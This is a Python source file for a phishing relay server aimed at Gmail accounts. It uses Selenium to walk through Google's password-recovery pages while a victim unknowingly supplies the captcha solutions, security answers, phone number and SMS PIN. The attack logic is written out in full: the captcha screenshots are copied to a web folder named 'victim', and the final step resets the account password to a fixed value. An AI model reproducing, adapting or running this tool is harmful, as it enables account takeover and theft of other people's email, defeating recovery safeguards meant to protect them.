#A very basic Custom Selenim Web Server written in Python for GMAIL passowrd recovery.
# Original Article : http://www.debasish.in/2012/07/how-i-can-reset-your-gmail-password_28.html
#
#API:HTTP POST parameters:
#Enter Email Address: action=email&data=email@email.com
#Enter Captcha :  action=captcha&data=<code>
#Enter Secuirty Answer : action=ans&data=<answer>
#Bypass Type 2
#Ask for phone Number: action=sms&data=<phonenumber>
#Ask fro Security Code action=pin&data=<verification-code>
#Enter PIN action=pin&data=<pin>



import SocketServer
from socket import *
import threading
import thread
from PIL import Image
from selenium import webdriver
import os
import shutil
def checksec():                  #This function checks if recovery secret question is available or not of yes then click the buttn
        if "secret-question-text" in driver.page_source:
                fp3 = driver.find_element_by_id("3")
                fp3.click()
                return driver.find_element_by_class_name("secret-question-text").text
        else:
                return "NA"
def takesnap():			#Take screen shot to extarct the captcha image form recovery page.
	driver.save_screenshot('scr.png')
        img = Image.open('scr.png')
        box = (180,170,450,250)
        area = img.crop(box)
        area.save('captcha.png', 'png')
	shutil.copy2("captcha.png", "/var/www/victim/")
def checkcap():		#Check if captcha was successful or not
	if "Choose how to get back into your account" in driver.page_source:
		return "true"
	else: 
		return "false"
def fillcaptcha(cvalue):
        mail = driver.find_element_by_name("captchaanswerresponse")
        mail.send_keys(cvalue)
	btn = driver.find_element_by_xpath("//input[@value='Continue']")
        btn.click()
	if checkcap() == "true":		#Check if captcah was successful or not
		sec = checksec()		#Check if security question is available or not!
		if sec == "NA":
			return "SMSV"
		else:
			return sec
	else:
		return "FAIL"
def fillans(ans):				#Fill ans of 1st security question
	fp = driver.find_element_by_id("secretanswer")
	fp.send_keys(ans)
	btn = driver.find_element_by_xpath("//input[@value='Continue']")
        btn.click()
	f1 = driver.find_element_by_name("Passwd")
	f1.send_keys("newpassword")
	f2 = driver.find_element_by_name("PasswdAgain")
	f2.send_keys("newpassword")
	btn = driver.find_element_by_xpath("//input[@value='Reset password']");	
	btn.click()
def submitphone(phone):				#Submit phone number
	telno = driver.find_elements_by_class_name("english-text")
	telno[0].send_keys(phone)
	#telno.send_keys(phone)
	btn = driver.find_element_by_xpath("//input[@value='Continue']")
        btn.click()
	if "Get a verification code on my phone" in driver.page_source:
		return "INCR"
	else:
		return "CORR"
def enterpin(pin):				#Enter PIN in actual application
	txt = driver.find_element_by_id("pin_code_input")
	txt.send_keys(pin)
	btn = driver.find_element_by_xpath("//input[@value='Continue']")
        btn.click()
def do(q):					#Open the password recovery page
        driver.get("https://accounts.google.com/ServiceLogin?hl=en&continue=http://www.google.co.in/")
        fp = driver.find_element_by_id("link-forgot-passwd")
        fp.click()
        fp1 = driver.find_element_by_name("preoption")
        fp1.click()
        mail = driver.find_element_by_name("Email")
        mail.send_keys(q)
        btn = driver.find_element_by_xpath("//input[@value='Continue']")
        btn.click()
#check if captcha is there or not
	if "Type the characters you see in the picture below" in driver.page_source:
        	takesnap()
		return "true"				#Client will get this
	else:
		return "false"
class MyTCPHandler(SocketServer.BaseRequestHandler):	#HTTP server code starts here
    	def handle(self):
        	self.data = self.request.recv(1024).strip()	
        	rcvd = self.data
		post = rcvd.split('\r\n\r\n',1)
		params =  post[1].split('&',1)
		action = params[0].split('=',1)  	#holding action=action
		data = params[1].split('=',1)		#Holding data=email@email.com
		if action[1] == "email":
			print "[*] Request Email ID is ",data[1]
			self.request.sendall("200 OK\r\n\r\n"+do(data[1]))	#back true if captcha is available
		if action[1] == "captcha":
			print "[*] Captcha Detected"
			res = fillcaptcha(data[1])
			print "[*] Processing Captcha Image"
			if res == "FAIL":
				takesnap()
				self.request.sendall("200 OK\r\nContent-Type: text/html\r\n\n"+res)
			else:
				self.request.sendall("200 OK\r\nContent-Type: text/html\r\n\n"+res+"::ques")	#Send Back the security Question 
			if res == "SMSV":
                                self.request.sendall("200 OK\r\nContent-Type: text/html\r\n\n"+res)
		if action[1] == "ans":
			print "[*] Security Question's answer received"
			print "[*] Correct"
			print "[*] Changing Password"
			print "[*] Successfully Changed the password"
			fillans(data[1])
		if action[1] == "sms":
			res = submitphone(data[1])	#Submit phone returns "PASS" if correct else return "FAIL" 
			self.request.sendall("200 OK\r\nContent-Type: text/html\r\n\n"+res)
		if action[1] == "pin":
			enterpin(data[1])
if __name__ == "__main__":
	HOST, PORT = '', 9999
    	server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)
	print "[*] Custom Selenium Web Server Started.Listening on 127.0.0.1:9999"
    	print "[*] Openning WebDriver Browser"
	print "[*] Waiting for victim to respond"
	driver = webdriver.Firefox()
	server.serve_forever()
